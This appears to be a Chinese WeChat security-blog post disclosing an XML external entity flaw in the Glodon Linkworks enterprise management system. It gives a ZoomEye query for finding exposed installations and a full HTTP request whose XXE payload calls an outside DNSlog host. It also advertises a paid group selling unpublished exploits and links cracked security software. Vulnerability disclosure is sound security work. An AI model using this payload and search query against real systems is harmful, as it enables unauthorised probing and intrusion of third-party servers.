#  广联达企业管理系统DataFile.aspx存在外部实体注入漏洞(新day)-漏洞挖掘   
原创 漏洞挖掘  渗透安全HackTwo   2024-01-24 00:01  
  
###   
#   
0x01 产品简介  
          
广联达科技股份有限公司作为数字建筑平台服务商,围绕工程项目的全生命周期,为客户提供数字化软硬件产品、解决方案及相关服务。公司业务面向建设方、设计方、制造厂商、供应商、施工方、运营方等。  
这里  
我推荐利用**ZoomEye**搜索引擎发现影响资产6000+。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq4k2k356Lial2rcibia36AZ0uaAxGibhZDsVBIGscYk9Bpia3BAso5309zQldf1xgxdibDTffEmla9sLd6Q/640?wx_fmt=png&from=appmsg "")  
  
**声明******  
  
> 请自行搭建环境进行漏洞测试，该公众号或作者星球分享的工具、项目、漏洞仅供安全研究与学习之用请勿用于非法行为，如用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
  
  
TIPS: 末尾领取资料及福利  
  
0x02 漏洞描述        外部实体注入漏洞全称XML External Entity Injection即xml外部实体注入漏洞，外部实体注入漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。外部实体注入漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。0x03 ZoomEye语法app:"广联达 Linkworks"0x04 漏洞复现POC（今日漏洞POC大量资产存在暂不公开，需要的加入星球获取，自行搭建环境测试）POST /8t17l16mll/axxqnkrz5d/7l16mqb/dlqllf2.aspx HTTP/1.1Host: {}accept: */*User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: GTP_IdServer_LangID=2052Connection: closeContent-Length: 387<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY t SYSTEM "https://kl2vfa.dnslog.cn/">]><xmlx>&t;</xmlx>批量检测POC0x05 修复建议升级至最新版本，官方已经推出新的版本补丁包。0x06 内部福利介绍-又更新啦！近期更新的0day/1day(包含公开和未公开漏洞-仅列举部分)漏洞整理更新至500+需要的加入星球获取一些漏洞报告200+(仅列举部分)加入星球获取更多资源及视频资源持续更新中！        需要加入内部知识星球可点击下方链接，资源包含但不限于网上未公开的day漏洞（更新漏洞POC共500+），2024最新企业SRC/CNVD/Edu实战挖掘技巧报告，红队内网横向渗透，代码审计，JS逆向，SRC培训等课程。圈子对新人友好，加入圈子拥有FOFA shadan 360Quake ZoomEye Tide 零零信安Hunter等等高级会员账号，SRC文档，武器库。圈子里面资料价值至少在10K以上，目前星球内部主题400+，资源2000+，其他和网盘资源1w+并持续更新中，越早加入价格越低。(详情点击下方地址了解-->>还是觉得价格贵的师傅后台回复" 星球 "有优惠券使用名额有限先到先得)点击了解-->>内部VIP知识星球福利介绍V1.2版本-元旦优惠  
  
****  
**结尾**  
  
# 免责声明  
  
  
# 获取方法  
  
  
****  
回复“**app**" 获取  app渗透和app抓包教程  
  
回复“**渗透字典**" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。  
  
回复“**书籍**" 获取 网络安全相关经典书籍电子版pdf  
  
压缩包解压密码：HackTwo  
  
  
  
# 免责声明  
  
  
        
文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如  
用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。  
如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。  
本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
# 往期推荐  
  
  
**1. 内部VIP知识星球福利介绍V1.2版本-元旦优惠**  
  
**2. 最新BurpSuite2023.12.1专业版中英文版下载**  
  
**3. 最新Nessus2024下载Windows/Linux**  
  
[4. 最新xray1.9.11高级版下载Windows/Linux](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483882&idx=1&sn=e1bf597eb73ee7881ae132cc99ac0c8e&chksm=cf16a75af8612e4c73eda9f52218ccfc6de72725eb37aff59e181435de095b71e653b446c521&scene=21#wechat_redirect)  
  
  
[5. 最新HCL AppScan Standard 10.4.128273破解版下载](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483850&idx=1&sn=8fad4ed1e05443dce28f6ee6d89ab920&chksm=cf16a77af8612e6c688c55f7a899fe123b0f71735eb15988321d0bd4d14363690c96537bc1fb&scene=21#wechat_redirect)  
  
  
  
###### 渗透安全HackTwo  
  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
  
喜欢的朋友可以点赞转发支持一下  
  
  
